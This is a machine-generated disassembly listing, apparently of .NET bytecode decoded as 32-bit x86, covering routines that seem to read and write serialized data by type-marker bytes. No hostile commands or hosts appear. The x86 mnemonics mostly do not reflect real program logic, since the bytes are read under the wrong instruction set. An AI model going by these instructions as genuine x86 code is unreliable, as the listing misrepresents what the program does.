  4051b3:	58                   	pop    %eax
  4051b4:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4051b9:	2a 06                	sub    (%esi),%al
  4051bb:	20 de                	and    %bl,%dh
  4051bd:	00 00                	add    %al,(%eax)
  4051bf:	00 40 55             	add    %al,0x55(%eax)
  4051c2:	00 00                	add    %al,(%eax)
  4051c4:	00 18                	add    %bl,(%eax)
  4051c6:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4051ca:	01 0b                	add    %ecx,(%ebx)
  4051cc:	03 07                	add    (%edi),%eax
  4051ce:	16                   	push   %ss
  4051cf:	18 6f 45             	sbb    %ch,0x45(%edi)
  4051d2:	00 00                	add    %al,(%eax)
  4051d4:	0a 26                	or     (%esi),%ah
  4051d6:	07                   	pop    %es
  4051d7:	28 58 00             	sub    %bl,0x0(%eax)
  4051da:	00 06                	add    %al,(%esi)
  4051dc:	0b 07                	or     (%edi),%eax
  4051de:	16                   	push   %ss
  4051df:	28 07                	sub    %al,(%edi)
  4051e1:	01 00                	add    %eax,(%eax)
  4051e3:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4051e6:	28 6b 00             	sub    %ch,0x0(%ebx)
  4051e9:	00 06                	add    %al,(%esi)
  4051eb:	02 18                	add    (%eax),%bl
  4051ed:	7d 36                	jge    0x405225
  4051ef:	00 00                	add    %al,(%eax)
  4051f1:	04 16                	add    $0x16,%al
  4051f3:	0d 38 1c 00 00       	or     $0x1c38,%eax
  4051f8:	00 02                	add    %al,(%edx)
  4051fa:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4051fe:	06                   	push   %es
  4051ff:	25 03 28 96 00       	and    $0x962803,%eax
  405204:	00 06                	add    %al,(%esi)
  405206:	6f                   	outsl  %ds:(%esi),(%dx)
  405207:	6a 00                	push   $0x0
  405209:	00 06                	add    %al,(%esi)
  40520b:	03 6f 88             	add    -0x78(%edi),%ebp
  40520e:	00 00                	add    %al,(%eax)
  405210:	06                   	push   %es
  405211:	09 17                	or     %edx,(%edi)
  405213:	58                   	pop    %eax
  405214:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405219:	2a 06                	sub    (%esi),%al
  40521b:	20 df                	and    %bl,%bh
  40521d:	00 00                	add    %al,(%eax)
  40521f:	00 40 55             	add    %al,0x55(%eax)
  405222:	00 00                	add    %al,(%eax)
  405224:	00 1a                	add    %bl,(%edx)
  405226:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40522a:	01 0b                	add    %ecx,(%ebx)
  40522c:	03 07                	add    (%edi),%eax
  40522e:	16                   	push   %ss
  40522f:	1a 6f 45             	sbb    0x45(%edi),%ch
  405232:	00 00                	add    %al,(%eax)
  405234:	0a 26                	or     (%esi),%ah
  405236:	07                   	pop    %es
  405237:	28 58 00             	sub    %bl,0x0(%eax)
  40523a:	00 06                	add    %al,(%esi)
  40523c:	0b 07                	or     (%edi),%eax
  40523e:	16                   	push   %ss
  40523f:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405243:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405246:	28 6b 00             	sub    %ch,0x0(%ebx)
  405249:	00 06                	add    %al,(%esi)
  40524b:	02 18                	add    (%eax),%bl
  40524d:	7d 36                	jge    0x405285
  40524f:	00 00                	add    %al,(%eax)
  405251:	04 16                	add    $0x16,%al
  405253:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405258:	00 02                	add    %al,(%edx)
  40525a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40525e:	06                   	push   %es
  40525f:	25 03 28 96 00       	and    $0x962803,%eax
  405264:	00 06                	add    %al,(%esi)
  405266:	6f                   	outsl  %ds:(%esi),(%dx)
  405267:	6a 00                	push   $0x0
  405269:	00 06                	add    %al,(%esi)
  40526b:	03 6f 88             	add    -0x78(%edi),%ebp
  40526e:	00 00                	add    %al,(%eax)
  405270:	06                   	push   %es
  405271:	09 17                	or     %edx,(%edi)
  405273:	58                   	pop    %eax
  405274:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405279:	2a 06                	sub    (%esi),%al
  40527b:	20 da                	and    %bl,%dl
  40527d:	00 00                	add    %al,(%eax)
  40527f:	00 40 0e             	add    %al,0xe(%eax)
  405282:	00 00                	add    %al,(%eax)
  405284:	00 02                	add    %al,(%edx)
  405286:	06                   	push   %es
  405287:	03 28                	add    (%eax),%ebp
  405289:	97                   	xchg   %eax,%edi
  40528a:	00 00                	add    %al,(%eax)
  40528c:	06                   	push   %es
  40528d:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  405293:	06                   	push   %es
  405294:	20 db                	and    %bl,%bl
  405296:	00 00                	add    %al,(%eax)
  405298:	00 40 0e             	add    %al,0xe(%eax)
  40529b:	00 00                	add    %al,(%eax)
  40529d:	00 02                	add    %al,(%edx)
  40529f:	06                   	push   %es
  4052a0:	03 28                	add    (%eax),%ebp
  4052a2:	97                   	xchg   %eax,%edi
  4052a3:	00 00                	add    %al,(%eax)
  4052a5:	06                   	push   %es
  4052a6:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  4052ac:	06                   	push   %es
  4052ad:	20 d0                	and    %dl,%al
  4052af:	00 00                	add    %al,(%eax)
  4052b1:	00 40 0f             	add    %al,0xf(%eax)
  4052b4:	00 00                	add    %al,(%eax)
  4052b6:	00 02                	add    %al,(%edx)
  4052b8:	03 6f 00             	add    0x0(%edi),%ebp
  4052bb:	01 00                	add    %eax,(%eax)
  4052bd:	0a 67 6a             	or     0x6a(%edi),%ah
  4052c0:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  4052c4:	06                   	push   %es
  4052c5:	2a 06                	sub    (%esi),%al
  4052c7:	20 d1                	and    %dl,%cl
  4052c9:	00 00                	add    %al,(%eax)
  4052cb:	00 40 27             	add    %al,0x27(%eax)
  4052ce:	00 00                	add    %al,(%eax)
  4052d0:	00 18                	add    %bl,(%eax)
  4052d2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4052d6:	01 0b                	add    %ecx,(%ebx)
  4052d8:	03 07                	add    (%edi),%eax
  4052da:	16                   	push   %ss
  4052db:	18 6f 45             	sbb    %ch,0x45(%edi)
  4052de:	00 00                	add    %al,(%eax)
  4052e0:	0a 26                	or     (%esi),%ah
  4052e2:	07                   	pop    %es
  4052e3:	28 58 00             	sub    %bl,0x0(%eax)
  4052e6:	00 06                	add    %al,(%esi)
  4052e8:	0b 02                	or     (%edx),%eax
  4052ea:	07                   	pop    %es
  4052eb:	16                   	push   %ss
  4052ec:	28 07                	sub    %al,(%edi)
  4052ee:	01 00                	add    %eax,(%eax)
  4052f0:	0a 6a 28             	or     0x28(%edx),%ch
  4052f3:	74 00                	je     0x4052f5
  4052f5:	00 06                	add    %al,(%esi)
  4052f7:	2a 06                	sub    (%esi),%al
  4052f9:	20 d2                	and    %dl,%dl
  4052fb:	00 00                	add    %al,(%eax)
  4052fd:	00 40 27             	add    %al,0x27(%eax)
  405300:	00 00                	add    %al,(%eax)
  405302:	00 1a                	add    %bl,(%edx)
  405304:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405308:	01 0b                	add    %ecx,(%ebx)
  40530a:	03 07                	add    (%edi),%eax
  40530c:	16                   	push   %ss
  40530d:	1a 6f 45             	sbb    0x45(%edi),%ch
  405310:	00 00                	add    %al,(%eax)
  405312:	0a 26                	or     (%esi),%ah
  405314:	07                   	pop    %es
  405315:	28 58 00             	sub    %bl,0x0(%eax)
  405318:	00 06                	add    %al,(%esi)
  40531a:	0b 02                	or     (%edx),%eax
  40531c:	07                   	pop    %es
  40531d:	16                   	push   %ss
  40531e:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405322:	0a 6a 28             	or     0x28(%edx),%ch
  405325:	74 00                	je     0x405327
  405327:	00 06                	add    %al,(%esi)
  405329:	2a 06                	sub    (%esi),%al
  40532b:	20 d3                	and    %dl,%bl
  40532d:	00 00                	add    %al,(%eax)
  40532f:	00 40 25             	add    %al,0x25(%eax)
  405332:	00 00                	add    %al,(%eax)
  405334:	00 1e                	add    %bl,(%esi)
  405336:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40533a:	01 0b                	add    %ecx,(%ebx)
  40533c:	03 07                	add    (%edi),%eax
  40533e:	16                   	push   %ss
  40533f:	1e                   	push   %ds
  405340:	6f                   	outsl  %ds:(%esi),(%dx)
  405341:	45                   	inc    %ebp
  405342:	00 00                	add    %al,(%eax)
  405344:	0a 26                	or     (%esi),%ah
  405346:	07                   	pop    %es
  405347:	28 58 00             	sub    %bl,0x0(%eax)
  40534a:	00 06                	add    %al,(%esi)
  40534c:	0b 02                	or     (%edx),%eax
  40534e:	07                   	pop    %es
  40534f:	16                   	push   %ss
  405350:	28 08                	sub    %cl,(%eax)
  405352:	01 00                	add    %eax,(%eax)
  405354:	0a 28                	or     (%eax),%ch
  405356:	74 00                	je     0x405358
  405358:	00 06                	add    %al,(%esi)
  40535a:	2a 00                	sub    (%eax),%al
  40535c:	1b 30                	sbb    (%eax),%esi
  40535e:	04 00                	add    $0x0,%al
  405360:	4d                   	dec    %ebp
  405361:	00 00                	add    %al,(%eax)
  405363:	00 27                	add    %ah,(%edi)
  405365:	00 00                	add    %al,(%eax)
  405367:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40536a:	00 00                	add    %al,(%eax)
  40536c:	0a 0a                	or     (%edx),%cl
  40536e:	02 06                	add    (%esi),%al
  405370:	28 8a 00 00 06 06    	sub    %cl,0x6060000(%edx)
  405376:	6f                   	outsl  %ds:(%esi),(%dx)
  405377:	e2 00                	loop   0x405379
  405379:	00 0a                	add    %cl,(%edx)
  40537b:	d4 8d                	aam    $0x8d
  40537d:	44                   	inc    %esp
  40537e:	00 00                	add    %al,(%eax)
  405380:	01 0b                	add    %ecx,(%ebx)
  405382:	06                   	push   %es
  405383:	16                   	push   %ss
  405384:	6a 6f                	push   $0x6f
  405386:	4e                   	dec    %esi
  405387:	00 00                	add    %al,(%eax)
  405389:	0a 06                	or     (%esi),%al
  40538b:	07                   	pop    %es
  40538c:	16                   	push   %ss
  40538d:	06                   	push   %es
  40538e:	6f                   	outsl  %ds:(%esi),(%dx)
  40538f:	e2 00                	loop   0x405391
  405391:	00 0a                	add    %cl,(%edx)
  405393:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40539a:	07                   	pop    %es
  40539b:	28 a3 00 00 06 0c    	sub    %ah,0xc060000(%ebx)
  4053a1:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  4053a7:	39 06                	cmp    %eax,(%esi)
  4053a9:	00 00                	add    %al,(%eax)
  4053ab:	00 06                	add    %al,(%esi)
  4053ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4053ae:	33 00                	xor    (%eax),%eax
  4053b0:	00 0a                	add    %cl,(%edx)
  4053b2:	dc 08                	fmull  (%eax)
  4053b4:	2a 00                	sub    (%eax),%al
  4053b6:	00 00                	add    %al,(%eax)
  4053b8:	01 10                	add    %edx,(%eax)
  4053ba:	00 00                	add    %al,(%eax)
  4053bc:	02 00                	add    (%eax),%al
  4053be:	06                   	push   %es
  4053bf:	00 38                	add    %bh,(%eax)
  4053c1:	3e 00 0d 00 00 00 00 	add    %cl,%ds:0x0
  4053c8:	13 30                	adc    (%eax),%esi
  4053ca:	02 00                	add    (%eax),%al
  4053cc:	ec                   	in     (%dx),%al
  4053cd:	00 00                	add    %al,(%eax)
  4053cf:	00 20                	add    %ah,(%eax)
  4053d1:	00 00                	add    %al,(%eax)
  4053d3:	11 02                	adc    %eax,(%edx)
  4053d5:	7b 36                	jnp    0x40540d
  4053d7:	00 00                	add    %al,(%eax)
  4053d9:	04 0a                	add    $0xa,%al
  4053db:	06                   	push   %es
  4053dc:	45                   	inc    %ebp
  4053dd:	0c 00                	or     $0x0,%al
  4053df:	00 00                	add    %al,(%eax)
  4053e1:	05 00 00 00 05       	add    $0x5000000,%eax
  4053e6:	00 00                	add    %al,(%eax)
  4053e8:	00 98 00 00 00 a0    	add    %bl,-0x60000000(%eax)
  4053ee:	00 00                	add    %al,(%eax)
  4053f0:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4053f3:	00 00                	add    %al,(%eax)
  4053f5:	1e                   	push   %ds
  4053f6:	00 00                	add    %al,(%eax)
  4053f8:	00 30                	add    %dh,(%eax)
  4053fa:	00 00                	add    %al,(%eax)
  4053fc:	00 42 00             	add    %al,0x0(%edx)
  4053ff:	00 00                	add    %al,(%eax)
  405401:	54                   	push   %esp
  405402:	00 00                	add    %al,(%eax)
  405404:	00 66 00             	add    %ah,0x0(%esi)
  405407:	00 00                	add    %al,(%eax)
  405409:	79 00                	jns    0x40540b
  40540b:	00 00                	add    %al,(%eax)
  40540d:	86 00                	xchg   %al,(%eax)
  40540f:	00 00                	add    %al,(%eax)
  405411:	38 a3 00 00 00 03    	cmp    %ah,0x3000000(%ebx)
  405417:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  40541d:	03 02                	add    (%edx),%eax
  40541f:	7b 35                	jnp    0x405456
  405421:	00 00                	add    %al,(%eax)
  405423:	04 74                	add    $0x74,%al
  405425:	38 00                	cmp    %al,(%eax)
  405427:	00 01                	add    %al,(%ecx)
  405429:	28 9a 00 00 06 2a    	sub    %bl,0x2a060000(%edx)
  40542f:	03 02                	add    (%edx),%eax
  405431:	7b 35                	jnp    0x405468
  405433:	00 00                	add    %al,(%eax)
  405435:	04 a5                	add    $0xa5,%al
  405437:	68 00 00 01 28       	push   $0x28010000
  40543c:	a0 00 00 06 2a       	mov    0x2a060000,%al
  405441:	03 02                	add    (%edx),%eax
  405443:	7b 35                	jnp    0x40547a
  405445:	00 00                	add    %al,(%eax)
  405447:	04 a5                	add    $0xa5,%al
  405449:	95                   	xchg   %eax,%ebp
  40544a:	00 00                	add    %al,(%eax)
  40544c:	01 28                	add    %ebp,(%eax)
  40544e:	9f                   	lahf
  40544f:	00 00                	add    %al,(%eax)
  405451:	06                   	push   %es
  405452:	2a 03                	sub    (%ebx),%al
  405454:	02 7b 35             	add    0x35(%ebx),%bh
  405457:	00 00                	add    %al,(%eax)
  405459:	04 a5                	add    $0xa5,%al
  40545b:	6c                   	insb   (%dx),%es:(%edi)
  40545c:	00 00                	add    %al,(%eax)
  40545e:	01 28                	add    %ebp,(%eax)
  405460:	9e                   	sahf
  405461:	00 00                	add    %al,(%eax)
  405463:	06                   	push   %es
  405464:	2a 03                	sub    (%ebx),%al
  405466:	02 7b 35             	add    0x35(%ebx),%bh
  405469:	00 00                	add    %al,(%eax)
  40546b:	04 a5                	add    $0xa5,%al
  40546d:	96                   	xchg   %eax,%esi
  40546e:	00 00                	add    %al,(%eax)
  405470:	01 28                	add    %ebp,(%eax)
  405472:	9c                   	pushf
  405473:	00 00                	add    %al,(%eax)
  405475:	06                   	push   %es
  405476:	2a 03                	sub    (%ebx),%al
  405478:	02 7b 35             	add    0x35(%ebx),%bh
  40547b:	00 00                	add    %al,(%eax)
  40547d:	04 a5                	add    $0xa5,%al
  40547f:	97                   	xchg   %eax,%edi
  405480:	00 00                	add    %al,(%eax)
  405482:	01 6c 28 9c          	add    %ebp,-0x64(%eax,%ebp,1)
  405486:	00 00                	add    %al,(%eax)
  405488:	06                   	push   %es
  405489:	2a 03                	sub    (%ebx),%al
  40548b:	02 28                	add    (%eax),%ch
  40548d:	77 00                	ja     0x40548f
  40548f:	00 06                	add    %al,(%esi)
  405491:	28 a0 00 00 06 2a    	sub    %ah,0x2a060000(%eax)
  405497:	03 02                	add    (%edx),%eax
  405499:	7b 35                	jnp    0x4054d0
  40549b:	00 00                	add    %al,(%eax)
  40549d:	04 74                	add    $0x74,%al
  40549f:	02 00                	add    (%eax),%al
  4054a1:	00 1b                	add    %bl,(%ebx)
  4054a3:	28 9b 00 00 06 2a    	sub    %bl,0x2a060000(%ebx)
  4054a9:	02 03                	add    (%ebx),%al
  4054ab:	28 72 00             	sub    %dh,0x0(%edx)
  4054ae:	00 06                	add    %al,(%esi)
  4054b0:	2a 02                	sub    (%edx),%al
  4054b2:	03 28                	add    (%eax),%ebp
  4054b4:	73 00                	jae    0x4054b6
  4054b6:	00 06                	add    %al,(%esi)
  4054b8:	2a 03                	sub    (%ebx),%al
  4054ba:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  4054c0:	1b 30                	sbb    (%eax),%esi
  4054c2:	03 00                	add    (%eax),%eax
  4054c4:	42                   	inc    %edx
  4054c5:	00 00                	add    %al,(%eax)
  4054c7:	00 28                	add    %ch,(%eax)
  4054c9:	00 00                	add    %al,(%eax)
  4054cb:	11 02                	adc    %eax,(%edx)
  4054cd:	0a 16                	or     (%esi),%dl
  4054cf:	0b 06                	or     (%esi),%eax
  4054d1:	12 01                	adc    (%ecx),%al
  4054d3:	28 49 00             	sub    %cl,0x0(%ecx)
  4054d6:	00 0a                	add    %cl,(%edx)
  4054d8:	02 7b 39             	add    0x39(%ebx),%bh
  4054db:	00 00                	add    %al,(%eax)
  4054dd:	04 3a                	add    $0x3a,%al
  4054df:	12 00                	adc    (%eax),%al
  4054e1:	00 00                	add    %al,(%eax)
  4054e3:	02 02                	add    (%edx),%al
  4054e5:	02 7b 38             	add    0x38(%ebx),%bh
  4054e8:	00 00                	add    %al,(%eax)
  4054ea:	04 73                	add    $0x73,%al
  4054ec:	63 00                	arpl   %eax,(%eax)
  4054ee:	00 06                	add    %al,(%esi)
  4054f0:	7d 39                	jge    0x40552b
  4054f2:	00 00                	add    %al,(%eax)
  4054f4:	04 dd                	add    $0xdd,%al
  4054f6:	0d 00 00 00 07       	or     $0x7000000,%eax
  4054fb:	39 06                	cmp    %eax,(%esi)
  4054fd:	00 00                	add    %al,(%eax)
  4054ff:	00 06                	add    %al,(%esi)
  405501:	28 50 00             	sub    %dl,0x0(%eax)
  405504:	00 0a                	add    %cl,(%edx)
  405506:	dc 02                	faddl  (%edx)
  405508:	7b 39                	jnp    0x405543
  40550a:	00 00                	add    %al,(%eax)
  40550c:	04 2a                	add    $0x2a,%al
  40550e:	00 00                	add    %al,(%eax)
  405510:	01 10                	add    %edx,(%eax)
  405512:	00 00                	add    %al,(%eax)
  405514:	02 00                	add    (%eax),%al
  405516:	04 00                	add    $0x0,%al
  405518:	2a 2e                	sub    (%esi),%ch
  40551a:	00 0d 00 00 00 00    	add    %cl,0x0
  405520:	13 30                	adc    (%eax),%esi
  405522:	04 00                	add    $0x0,%al
  405524:	18 00                	sbb    %al,(%eax)
  405526:	00 00                	add    %al,(%eax)
  405528:	29 00                	sub    %eax,(%eax)
  40552a:	00 11                	add    %dl,(%ecx)
  40552c:	03 8d 44 00 00 01    	add    0x1000044(%ebp),%ecx
  405532:	0a 02                	or     (%edx),%al
  405534:	06                   	push   %es
  405535:	16                   	push   %ss
  405536:	03 6f 45             	add    0x45(%edi),%ebp
  405539:	00 00                	add    %al,(%eax)
  40553b:	0a 26                	or     (%esi),%ah
  40553d:	06                   	push   %es
  40553e:	28 55 00             	sub    %dl,0x0(%ebp)
  405541:	00 06                	add    %al,(%esi)
  405543:	2a 13                	sub    (%ebx),%dl
  405545:	30 04 00             	xor    %al,(%eax,%eax,1)
  405548:	b1 00                	mov    $0x0,%cl
  40554a:	00 00                	add    %al,(%eax)
  40554c:	2a 00                	sub    (%eax),%al
  40554e:	00 11                	add    %dl,(%ecx)
  405550:	14 0a                	adc    $0xa,%al
  405552:	16                   	push   %ss
  405553:	0b 02                	or     (%edx),%eax
  405555:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  40555b:	18 00                	sbb    %al,(%eax)
  40555d:	00 00                	add    %al,(%eax)
  40555f:	02 20                	add    (%eax),%ah
  405561:	bf 00 00 00 3d       	mov    $0x3d000000,%edi
  405566:	0d 00 00 00 02       	or     $0x2000000,%eax
  40556b:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  405571:	0b 38                	or     (%eax),%edi
  405573:	72 00                	jb     0x405575
  405575:	00 00                	add    %al,(%eax)
  405577:	02 20                	add    (%eax),%ah
  405579:	d9 00                	flds   (%eax)
  40557b:	00 00                	add    %al,(%eax)
  40557d:	40                   	inc    %eax
  40557e:	0c 00                	or     $0x0,%al
  405580:	00 00                	add    %al,(%eax)
  405582:	03 6f 00             	add    0x0(%edi),%ebp
  405585:	01 00                	add    %eax,(%eax)
  405587:	0a 0b                	or     (%ebx),%cl
  405589:	38 5b 00             	cmp    %bl,0x0(%ebx)
  40558c:	00 00                	add    %al,(%eax)
  40558e:	02 20                	add    (%eax),%ah
  405590:	da 00                	fiaddl (%eax)
  405592:	00 00                	add    %al,(%eax)
  405594:	40                   	inc    %eax
  405595:	25 00 00 00 18       	and    $0x18000000,%eax
  40559a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40559e:	01 0a                	add    %ecx,(%edx)
  4055a0:	03 06                	add    (%esi),%eax
  4055a2:	16                   	push   %ss
  4055a3:	18 6f 45             	sbb    %ch,0x45(%edi)
  4055a6:	00 00                	add    %al,(%eax)
  4055a8:	0a 26                	or     (%esi),%ah
  4055aa:	06                   	push   %es
  4055ab:	28 58 00             	sub    %bl,0x0(%eax)
  4055ae:	00 06                	add    %al,(%esi)
  4055b0:	0a 06                	or     (%esi),%al
  4055b2:	16                   	push   %ss
  4055b3:	28 02                	sub    %al,(%edx)
  4055b5:	01 00                	add    %eax,(%eax)
  4055b7:	0a 0b                	or     (%ebx),%cl
  4055b9:	38 2b                	cmp    %ch,(%ebx)
  4055bb:	00 00                	add    %al,(%eax)
  4055bd:	00 02                	add    %al,(%edx)
  4055bf:	20 db                	and    %bl,%bl
  4055c1:	00 00                	add    %al,(%eax)
  4055c3:	00 40 20             	add    %al,0x20(%eax)
  4055c6:	00 00                	add    %al,(%eax)
  4055c8:	00 1a                	add    %bl,(%edx)
  4055ca:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055ce:	01 0a                	add    %ecx,(%edx)
  4055d0:	03 06                	add    (%esi),%eax
  4055d2:	16                   	push   %ss
  4055d3:	1a 6f 45             	sbb    0x45(%edi),%ch
  4055d6:	00 00                	add    %al,(%eax)
  4055d8:	0a 26                	or     (%esi),%ah
  4055da:	06                   	push   %es
  4055db:	28 58 00             	sub    %bl,0x0(%eax)
  4055de:	00 06                	add    %al,(%esi)
  4055e0:	0a 06                	or     (%esi),%al
  4055e2:	16                   	push   %ss
  4055e3:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4055e7:	0a 0b                	or     (%ebx),%cl
  4055e9:	07                   	pop    %es
  4055ea:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055ee:	01 0a                	add    %ecx,(%edx)
  4055f0:	03 06                	add    (%esi),%eax
  4055f2:	16                   	push   %ss
  4055f3:	07                   	pop    %es
  4055f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4055f5:	45                   	inc    %ebp
  4055f6:	00 00                	add    %al,(%eax)
  4055f8:	0a 26                	or     (%esi),%ah
  4055fa:	06                   	push   %es
  4055fb:	28 55 00             	sub    %dl,0x0(%ebp)
  4055fe:	00 06                	add    %al,(%esi)
  405600:	2a 00                	sub    (%eax),%al
  405602:	00 00                	add    %al,(%eax)
  405604:	13 30                	adc    (%eax),%esi
  405606:	04 00                	add    $0x0,%al
  405608:	b9 00 00 00 2b       	mov    $0x2b000000,%ecx
  40560d:	00 00                	add    %al,(%eax)
  40560f:	11 03                	adc    %eax,(%ebx)
  405611:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  405615:	06                   	push   %es
  405616:	0a 14 0b             	or     (%ebx,%ecx,1),%dl
  405619:	06                   	push   %es
  40561a:	8e 69 0c             	mov    0xc(%ecx),%gs
  40561d:	16                   	push   %ss
  40561e:	0d 08 1f 1f 3d       	or     $0x3d1f1f08,%eax
  405623:	16                   	push   %ss
  405624:	00 00                	add    %al,(%eax)
  405626:	00 20                	add    %ah,(%eax)
  405628:	a0 00 00 00 08       	mov    0x8000000,%al
  40562d:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  405630:	0d 02 09 6f ee       	or     $0xee6f0902,%eax
  405635:	00 00                	add    %al,(%eax)
  405637:	0a 38                	or     (%eax),%bh
  405639:	80 00 00             	addb   $0x0,(%eax)
  40563c:	00 08                	add    %cl,(%eax)
  40563e:	20 ff                	and    %bh,%bh
  405640:	00 00                	add    %al,(%eax)
  405642:	00 3d 1c 00 00 00    	add    %bh,0x1c
  405648:	20 d9                	and    %bl,%cl
  40564a:	00 00                	add    %al,(%eax)
  40564c:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405652:	00 00                	add    %al,(%eax)
  405654:	0a 08                	or     (%eax),%cl
  405656:	d2 0d 02 09 6f ee    	rorb   %cl,0xee6f0902
  40565c:	00 00                	add    %al,(%eax)
  40565e:	0a 38                	or     (%eax),%bh
  405660:	59                   	pop    %ecx
  405661:	00 00                	add    %al,(%eax)
  405663:	00 08                	add    %cl,(%eax)
  405665:	20 ff                	and    %bh,%bh
  405667:	ff 00                	incl   (%eax)
  405669:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40566f:	20 da                	and    %bl,%dl
  405671:	00 00                	add    %al,(%eax)
  405673:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405679:	00 00                	add    %al,(%eax)
  40567b:	0a 08                	or     (%eax),%cl
  40567d:	68 28 ef 00 00       	push   $0xef28
  405682:	0a 28                	or     (%eax),%ch
  405684:	58                   	pop    %eax
  405685:	00 00                	add    %al,(%eax)
  405687:	06                   	push   %es
  405688:	0b 02                	or     (%edx),%eax
  40568a:	07                   	pop    %es
  40568b:	16                   	push   %ss
  40568c:	07                   	pop    %es
  40568d:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405690:	4c                   	dec    %esp
  405691:	00 00                	add    %al,(%eax)
  405693:	0a 38                	or     (%eax),%bh
  405695:	24 00                	and    $0x0,%al
  405697:	00 00                	add    %al,(%eax)
  405699:	20 db                	and    %bl,%bl
  40569b:	00 00                	add    %al,(%eax)
  40569d:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  4056a3:	00 00                	add    %al,(%eax)
  4056a5:	0a 08                	or     (%eax),%cl
  4056a7:	28 4a 00             	sub    %cl,0x0(%edx)
  4056aa:	00 0a                	add    %cl,(%edx)
  4056ac:	28 58 00             	sub    %bl,0x0(%eax)
  4056af:	00 06                	add    %al,(%esi)
  4056b1:	0b 02                	or     (%edx),%eax
  4056b3:	07                   	pop    %es
  4056b4:	16                   	push   %ss
  4056b5:	07                   	pop    %es
  4056b6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056b9:	4c                   	dec    %esp
  4056ba:	00 00                	add    %al,(%eax)
  4056bc:	0a 02                	or     (%edx),%al
  4056be:	06                   	push   %es
  4056bf:	16                   	push   %ss
  4056c0:	06                   	push   %es
  4056c1:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056c4:	4c                   	dec    %esp
  4056c5:	00 00                	add    %al,(%eax)
  4056c7:	0a 2a                	or     (%edx),%ch
  4056c9:	00 00                	add    %al,(%eax)
  4056cb:	00 13                	add    %dl,(%ebx)
  4056cd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056d0:	94                   	xchg   %eax,%esp
  4056d1:	00 00                	add    %al,(%eax)
  4056d3:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4056d6:	00 11                	add    %dl,(%ecx)
  4056d8:	14 0a                	adc    $0xa,%al
  4056da:	03 8e 69 0b 16 0c    	add    0xc160b69(%esi),%ecx
  4056e0:	07                   	pop    %es
  4056e1:	20 ff                	and    %bh,%bh
  4056e3:	00 00                	add    %al,(%eax)
  4056e5:	00 3d 1c 00 00 00    	add    %bh,0x1c
  4056eb:	20 c4                	and    %al,%ah
  4056ed:	00 00                	add    %al,(%eax)
  4056ef:	00 0c 02             	add    %cl,(%edx,%eax,1)
  4056f2:	08 6f ee             	or     %ch,-0x12(%edi)
  4056f5:	00 00                	add    %al,(%eax)
  4056f7:	0a 07                	or     (%edi),%al
  4056f9:	d2 0c 02             	rorb   %cl,(%edx,%eax,1)
  4056fc:	08 6f ee             	or     %ch,-0x12(%edi)
  4056ff:	00 00                	add    %al,(%eax)
  405701:	0a 38                	or     (%eax),%bh
  405703:	59                   	pop    %ecx
  405704:	00 00                	add    %al,(%eax)
  405706:	00 07                	add    %al,(%edi)
  405708:	20 ff                	and    %bh,%bh
  40570a:	ff 00                	incl   (%eax)
  40570c:	00 3d 2a 00 00 00    	add    %bh,0x2a
  405712:	20 c5                	and    %al,%ch
  405714:	00 00                	add    %al,(%eax)
  405716:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405719:	08 6f ee             	or     %ch,-0x12(%edi)
  40571c:	00 00                	add    %al,(%eax)
  40571e:	0a 07                	or     (%edi),%al
  405720:	68 28 ef 00 00       	push   $0xef28
  405725:	0a 28                	or     (%eax),%ch
  405727:	58                   	pop    %eax
  405728:	00 00                	add    %al,(%eax)
  40572a:	06                   	push   %es
  40572b:	0a 02                	or     (%edx),%al
  40572d:	06                   	push   %es
  40572e:	16                   	push   %ss
  40572f:	06                   	push   %es
  405730:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405733:	4c                   	dec    %esp
  405734:	00 00                	add    %al,(%eax)
  405736:	0a 38                	or     (%eax),%bh
  405738:	24 00                	and    $0x0,%al
  40573a:	00 00                	add    %al,(%eax)
  40573c:	20 c6                	and    %al,%dh
  40573e:	00 00                	add    %al,(%eax)
  405740:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405743:	08 6f ee             	or     %ch,-0x12(%edi)
